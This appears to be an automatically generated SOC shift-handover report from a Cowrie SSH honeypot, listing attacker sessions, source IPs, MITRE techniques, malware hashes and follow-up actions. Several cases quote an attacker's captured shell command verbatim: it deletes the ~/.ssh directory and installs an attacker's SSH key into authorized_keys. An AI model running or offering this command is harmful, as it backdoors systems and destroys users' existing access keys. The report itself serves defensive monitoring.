| `2026-04-27 13:48:54` | `cowrie.command.input` |
| `2026-04-27 13:48:54` | `cowrie.command.failed` |
| `2026-04-27 13:48:54` | `cowrie.log.closed` |
| `2026-04-27 13:48:54` | `cowrie.session.params` |
| `2026-04-27 13:48:54` | `cowrie.command.input` |
| `2026-04-27 13:48:54` | `cowrie.session.file_download` |
| `2026-04-27 13:48:54` | `cowrie.log.closed` |
| `2026-04-27 13:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.124[.]127` to AbuseIPDB if not already reported
- [ ] Block `101.36.124[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a6b5a021651

| Field | Detail |
|---|---|
| **Source IP** | `101.36.124[.]127` |
| **First Seen** | 2026-04-27 13:48 |
| **Last Seen** | 2026-04-27 13:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 13:48:56` | `cowrie.session.connect` |
| `2026-04-27 13:48:56` | `cowrie.client.version` |
| `2026-04-27 13:48:56` | `cowrie.client.kex` |
| `2026-04-27 13:48:57` | `cowrie.login.success` |
| `2026-04-27 13:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.124[.]127` to AbuseIPDB if not already reported
- [ ] Block `101.36.124[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59a05149bc35

| Field | Detail |
|---|---|
| **Source IP** | `152.250.243[.]47` |
| **First Seen** | 2026-04-27 13:49 |
| **Last Seen** | 2026-04-27 13:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 13:49:17` | `cowrie.session.connect` |
| `2026-04-27 13:49:17` | `cowrie.client.version` |
| `2026-04-27 13:49:18` | `cowrie.client.kex` |
| `2026-04-27 13:49:19` | `cowrie.login.success` |
| `2026-04-27 13:49:20` | `cowrie.session.params` |
| `2026-04-27 13:49:20` | `cowrie.command.input` |
| `2026-04-27 13:49:20` | `cowrie.command.failed` |
| `2026-04-27 13:49:20` | `cowrie.log.closed` |
| `2026-04-27 13:49:21` | `cowrie.session.params` |
| `2026-04-27 13:49:21` | `cowrie.command.input` |
| `2026-04-27 13:49:21` | `cowrie.session.file_download` |
| `2026-04-27 13:49:21` | `cowrie.log.closed` |
| `2026-04-27 13:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.250.243[.]47` to AbuseIPDB if not already reported
- [ ] Block `152.250.243[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a11dd203f6ef

| Field | Detail |
|---|---|
| **Source IP** | `152.250.243[.]47` |
| **First Seen** | 2026-04-27 13:49 |
| **Last Seen** | 2026-04-27 13:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 13:49:25` | `cowrie.session.connect` |
| `2026-04-27 13:49:25` | `cowrie.client.version` |
| `2026-04-27 13:49:25` | `cowrie.client.kex` |
| `2026-04-27 13:49:26` | `cowrie.login.success` |
| `2026-04-27 13:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.250.243[.]47` to AbuseIPDB if not already reported
- [ ] Block `152.250.243[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb4807675d9a

| Field | Detail |
|---|---|
| **Source IP** | `179.32.33[.]161` |
| **First Seen** | 2026-04-27 13:51 |
| **Last Seen** | 2026-04-27 13:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 13:51:20` | `cowrie.session.connect` |
| `2026-04-27 13:51:20` | `cowrie.client.version` |
| `2026-04-27 13:51:20` | `cowrie.client.kex` |
| `2026-04-27 13:51:21` | `cowrie.login.success` |
| `2026-04-27 13:51:22` | `cowrie.session.params` |
| `2026-04-27 13:51:22` | `cowrie.command.input` |
| `2026-04-27 13:51:22` | `cowrie.command.failed` |
| `2026-04-27 13:51:22` | `cowrie.log.closed` |
| `2026-04-27 13:51:23` | `cowrie.session.params` |
| `2026-04-27 13:51:23` | `cowrie.command.input` |
| `2026-04-27 13:51:23` | `cowrie.session.file_download` |
| `2026-04-27 13:51:23` | `cowrie.log.closed` |
| `2026-04-27 13:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.33[.]161` to AbuseIPDB if not already reported
- [ ] Block `179.32.33[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dab22a52ba62

| Field | Detail |
|---|---|
| **Source IP** | `179.32.33[.]161` |
| **First Seen** | 2026-04-27 13:51 |
| **Last Seen** | 2026-04-27 13:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 13:51:27` | `cowrie.session.connect` |
| `2026-04-27 13:51:27` | `cowrie.client.version` |
| `2026-04-27 13:51:27` | `cowrie.client.kex` |
| `2026-04-27 13:51:28` | `cowrie.login.success` |
| `2026-04-27 13:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.33[.]161` to AbuseIPDB if not already reported
- [ ] Block `179.32.33[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a911a682b54

| Field | Detail |
|---|---|
| **Source IP** | `165.154.36[.]71` |
| **First Seen** | 2026-04-27 13:52 |
| **Last Seen** | 2026-04-27 13:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 13:52:32` | `cowrie.session.connect` |
| `2026-04-27 13:52:32` | `cowrie.client.version` |
| `2026-04-27 13:52:32` | `cowrie.client.kex` |
| `2026-04-27 13:52:33` | `cowrie.login.success` |
| `2026-04-27 13:52:34` | `cowrie.session.params` |
| `2026-04-27 13:52:34` | `cowrie.command.input` |
| `2026-04-27 13:52:34` | `cowrie.command.failed` |
| `2026-04-27 13:52:34` | `cowrie.log.closed` |
| `2026-04-27 13:52:34` | `cowrie.session.params` |
| `2026-04-27 13:52:34` | `cowrie.command.input` |
| `2026-04-27 13:52:35` | `cowrie.session.file_download` |
| `2026-04-27 13:52:35` | `cowrie.log.closed` |
| `2026-04-27 13:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.36[.]71` to AbuseIPDB if not already reported
- [ ] Block `165.154.36[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6c2f3b1f88b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.36[.]71` |
| **First Seen** | 2026-04-27 13:52 |
| **Last Seen** | 2026-04-27 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 13:52:38` | `cowrie.session.connect` |
| `2026-04-27 13:52:38` | `cowrie.client.version` |
| `2026-04-27 13:52:38` | `cowrie.client.kex` |
| `2026-04-27 13:52:39` | `cowrie.login.success` |
| `2026-04-27 13:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.36[.]71` to AbuseIPDB if not already reported
- [ ] Block `165.154.36[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15204feb0eaa

| Field | Detail |
|---|---|
| **Source IP** | `152.32.163[.]183` |
| **First Seen** | 2026-04-27 14:01 |
| **Last Seen** | 2026-04-27 14:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 14:01:09` | `cowrie.session.connect` |
| `2026-04-27 14:01:09` | `cowrie.client.version` |
| `2026-04-27 14:01:09` | `cowrie.client.kex` |
| `2026-04-27 14:01:09` | `cowrie.login.success` |
| `2026-04-27 14:01:09` | `cowrie.session.params` |
| `2026-04-27 14:01:09` | `cowrie.command.input` |
| `2026-04-27 14:01:09` | `cowrie.command.failed` |
| `2026-04-27 14:01:10` | `cowrie.log.closed` |
| `2026-04-27 14:01:10` | `cowrie.session.params` |
| `2026-04-27 14:01:10` | `cowrie.command.input` |
| `2026-04-27 14:01:10` | `cowrie.session.file_download` |
| `2026-04-27 14:01:10` | `cowrie.log.closed` |
| `2026-04-27 14:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.163[.]183` to AbuseIPDB if not already reported
- [ ] Block `152.32.163[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f027d2cc38dc

| Field | Detail |
|---|---|
| **Source IP** | `152.32.163[.]183` |
| **First Seen** | 2026-04-27 14:01 |
| **Last Seen** | 2026-04-27 14:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 14:01:12` | `cowrie.session.connect` |
| `2026-04-27 14:01:12` | `cowrie.client.version` |
| `2026-04-27 14:01:12` | `cowrie.client.kex` |
| `2026-04-27 14:01:12` | `cowrie.login.success` |
| `2026-04-27 14:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.163[.]183` to AbuseIPDB if not already reported
- [ ] Block `152.32.163[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `42.51.40[.]180` | **22** | 2026-04-27 10:30 | 2026-04-27 10:53 | 36m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]213` | **20** | 2026-04-27 12:09 | 2026-04-27 12:30 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `190.221.21[.]98` | **12** | 2026-04-27 10:38 | 2026-04-27 10:54 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `88.120.91[.]96` | **4** | 2026-04-27 11:36 | 2026-04-27 11:44 | 8m | 0 | `T1592` | 🟢 LOW |
| `183.87.217[.]222` | **3** | 2026-04-27 13:03 | 2026-04-27 13:04 | 1m | 0 | `T1592` | 🟢 LOW |
| `13.89.124[.]214` | **2** | 2026-04-27 12:54 | 2026-04-27 12:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `176.65.139[.]59` | **2** | 2026-04-27 13:34 | 2026-04-27 13:37 | 1m | 0 | `T1592` | 🟢 LOW |
| `183.129.249[.]4` | **2** | 2026-04-27 13:09 | 2026-04-27 13:11 | 2m | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | **2** | 2026-04-27 11:26 | 2026-04-27 11:31 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.36.124[.]127` | 1 | 2026-04-27 13:48 | 2026-04-27 13:48 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.176.179[.]134` | 1 | 2026-04-27 10:44 | 2026-04-27 10:44 | 16s | 1 | `T1110.001` | 🟢 LOW |
| `103.186.139[.]149` | 1 | 2026-04-27 13:48 | 2026-04-27 13:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.242.24[.]31` | 1 | 2026-04-27 12:00 | 2026-04-27 12:01 | 53s | 0 | `T1592` | 🟢 LOW |
| `13.218.167[.]231` | 1 | 2026-04-27 12:55 | 2026-04-27 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `152.250.243[.]47` | 1 | 2026-04-27 13:49 | 2026-04-27 13:49 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.163[.]183` | 1 | 2026-04-27 14:01 | 2026-04-27 14:01 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.36[.]71` | 1 | 2026-04-27 13:52 | 2026-04-27 13:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `167.86.108[.]126` | 1 | 2026-04-27 11:41 | 2026-04-27 11:41 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.32.33[.]161` | 1 | 2026-04-27 13:51 | 2026-04-27 13:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.153.204[.]5` | 1 | 2026-04-27 10:35 | 2026-04-27 10:36 | 9s | 0 | `T1592` | 🟢 LOW |
| `201.144.57[.]229` | 1 | 2026-04-27 12:47 | 2026-04-27 12:47 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.21.182[.]228` | 1 | 2026-04-27 12:29 | 2026-04-27 12:30 | 30s | 0 | `T1592` | 🟢 LOW |
| `27.128.240[.]75` | 1 | 2026-04-27 10:33 | 2026-04-27 10:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.134.187[.]172` | 1 | 2026-04-27 11:47 | 2026-04-27 11:47 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `70.114.116[.]180` | 1 | 2026-04-27 11:46 | 2026-04-27 11:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `190.221.21[.]98` | AR | FUND.PARA LA FORM.PROF.EN | **100** ⚠️ | 1 |
| `176.65.139[.]59` | NL | Storm Industries | **100** ⚠️ | 27 |
| `201.144.57[.]229` | MX | Gestión de direccionamiento UniNet | **100** ⚠️ | 1 |
| `167.86.108[.]126` | FR | Contabo GmbH | **100** ⚠️ | 4 |
| `103.176.179[.]134` | VN | 9TECH VIET NAM TRADING JOINT STOCK COMPANY | **100** ⚠️ | 6 |
| `20.153.204[.]5` | JP | Microsoft Corporation | **100** ⚠️ | 28 |
| `152.32.163[.]183` | VN | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `165.154.36[.]71` | US | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `43.134.187[.]172` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 17 |
| `103.186.139[.]149` | PH | EWS DS Networks Inc | **100** ⚠️ | 21 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 120 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 64 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 35 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 34 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 34 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 7 |
| AbuseIPDB score 4 below threshold 25 | 17 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 176 cases |
| Tool 34  | Credential Extractor        | ✅ 99 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (15.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 64 priority case(s) shown individually · 25 recon entry/entries in table (9 group(s) consolidating 69 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-27T14:03:41Z_
